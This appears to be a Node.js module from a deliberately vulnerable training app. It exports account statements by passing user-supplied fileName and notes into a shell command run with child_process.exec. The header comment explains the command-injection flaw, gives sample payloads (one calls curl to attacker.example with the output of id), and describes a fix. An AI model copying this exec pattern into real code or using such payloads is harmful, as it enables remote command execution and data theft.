/*
 * A1 - OS Command Injection
 *
 * This module renders an account statement to a text file on disk. Instead of
 * writing the file directly (fs.writeFile), it shells out via
 * child_process.exec() and builds the command string by concatenating
 * user-controlled values (fileName and notes, both supplied by the client in
 * statement.js -> handleExportRequest) directly into the shell command.
 *
 * Because exec() runs the string through /bin/sh, any shell metacharacter in
 * either value breaks out of the intended command:
 *
 *   fileName: statement"; curl http://attacker.example/$(id) #
 *   notes:    "; touch /tmp/pwned; echo "
 *
 * Fix: never build shell commands from user input. Write the file directly
 * with fs.writeFile (no shell involved), and separately validate fileName
 * against an allow-list pattern before using it in a path:
 *
 *   const safeName = fileName.replace(/[^a-zA-Z0-9_-]/g, "");
 *   fs.writeFile(`${EXPORT_DIR}/${safeName}.txt`, body, callback);
 */

const { exec } = require("child_process");
const fs = require("fs");
const path = require("path");

const EXPORT_DIR = path.join(__dirname, "../data/exports");

// Ensure the export directory exists so the app is usable out of the box
if (!fs.existsSync(EXPORT_DIR)) {
    fs.mkdirSync(EXPORT_DIR, { recursive: true });
}

const exportStatementToFile = (fileName, notes, previousStatements, callback) => {
    const filePath = `${EXPORT_DIR}/${fileName}.txt`;

    const history = (previousStatements || [])
        .map(s => `- ${s.fileName}: ${s.notes}`)
        .join("\n");

    const body = `Account Statement\n=================\n${notes}\n\nPrevious statements on file:\n${history}\n`
        .replace(/\n/g, "\\n");

    // Insecure: fileName and notes (embedded in `body`) come straight from the
    // request body and are interpolated into a shell command.
    const command = `echo "${body}" > "${filePath}"`;

    console.log(`[statement-export] Executing: ${command}`);

    exec(command, (err) => {
        if (err) return callback(err, null);
        return callback(null, { filePath, fileName });
    });
};

module.exports = { exportStatementToFile, EXPORT_DIR };
